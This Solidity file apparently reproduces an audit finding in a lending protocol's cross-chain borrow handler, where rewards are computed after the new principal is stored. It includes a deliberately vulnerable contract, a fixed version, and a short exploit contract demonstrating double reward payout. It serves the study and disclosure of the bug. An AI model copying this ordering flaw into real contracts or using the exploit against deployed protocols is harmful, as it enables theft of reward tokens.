// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LEND — _handleBorrowCrossChainRequest (Sherlock 2025-05, issue 773)
    The handler writes the new cross-chain principal and only then calls
    distributeBorrowerLend. That reward reads crossChainCollaterals, so the
    just-added principal is treated as if it had been open for the whole
    accrual window. A 100 borrow on top of 100 principal pays 200 LEND
    instead of 100.
*/

contract LendToken {
    string public symbol = "LEND";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract LendStorage {
    struct Borrow {
        uint32 srcEid;
        uint32 destEid;
        uint256 principle;
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    uint256 public constant INDEX = 1e18;
    uint32 public constant CURRENT_EID = 30101;
    LendToken public immutable lend;
    mapping(address => mapping(address => Borrow[])) public collaterals;

    constructor(LendToken _lend) {
        lend = _lend;
    }

    function seed(address user, address lToken, uint256 principle) external {
        collaterals[user][lToken].push(
            Borrow({
                srcEid: CURRENT_EID,
                destEid: CURRENT_EID,
                principle: principle,
                borrowIndex: INDEX,
                borrowedlToken: lToken,
                srcToken: lToken
            })
        );
    }

    function borrowWithInterest(address borrower, address lToken) public view returns (uint256 borrowedAmount) {
        Borrow[] memory rows = collaterals[borrower][lToken];
        for (uint256 i = 0; i < rows.length; i++) {
            if (rows[i].destEid == CURRENT_EID && rows[i].srcEid == CURRENT_EID) {
                borrowedAmount += (rows[i].principle * INDEX) / rows[i].borrowIndex;
            }
        }
    }

    function distributeBorrowerLend(address lToken, address borrower) public returns (uint256 paid) {
        uint256 borrowerAmount = borrowWithInterest(borrower, lToken);
        paid = borrowerAmount;
        lend.mint(borrower, paid);
    }

    function handleBorrowCrossChainRequest(address sender, address lToken, uint256 amount) external returns (uint256 paid) {
        Borrow[] memory rows = collaterals[sender][lToken];
        uint256 index = 0;
        bool found = rows.length > 0;
        if (found) {
            uint256 newPrincipleWithAmount = (rows[index].principle * INDEX) / rows[index].borrowIndex;
            rows[index].principle = newPrincipleWithAmount + amount;
            rows[index].borrowIndex = INDEX;
            collaterals[sender][lToken][index] = rows[index];
        }
        // @> VULN: distributeBorrowerLend runs after the new principal is stored, so the reward includes principal that was not borrowed during this window
        paid = distributeBorrowerLend(lToken, sender);
    }
}

contract LendStorageFixed {
    struct Borrow {
        uint32 srcEid;
        uint32 destEid;
        uint256 principle;
        uint256 borrowIndex;
    }

    uint256 public constant INDEX = 1e18;
    LendToken public immutable lend;
    mapping(address => Borrow) public row;

    constructor(LendToken _lend) {
        lend = _lend;
    }

    function seed(address user, uint256 principle) external {
        row[user] = Borrow(1, 1, principle, INDEX);
    }

    function handleBorrow(address sender, uint256 amount) external returns (uint256 paid) {
        paid = row[sender].principle;
        lend.mint(sender, paid);
        row[sender].principle = row[sender].principle + amount;
    }
}

contract Exploit {
    uint256 public constant OPEN = 100 ether;
    uint256 public constant MORE = 100 ether;
    LendToken public lend;
    LendStorage public book;
    uint256 public paid;

    constructor() {
        lend = new LendToken();
        book = new LendStorage(lend);
        book.seed(address(this), address(0xBEEF), OPEN);
    }

    function run() external {
        paid = book.handleBorrowCrossChainRequest(address(this), address(0xBEEF), MORE);
        require(book.borrowWithInterest(address(this), address(0xBEEF)) == OPEN + MORE, "principal includes new borrow");
        require(paid == OPEN + MORE, "reward on the new principal");
        require(paid > OPEN, "overpaid");
        require(lend.balanceOf(address(this)) == paid, "lend received");
    }
}
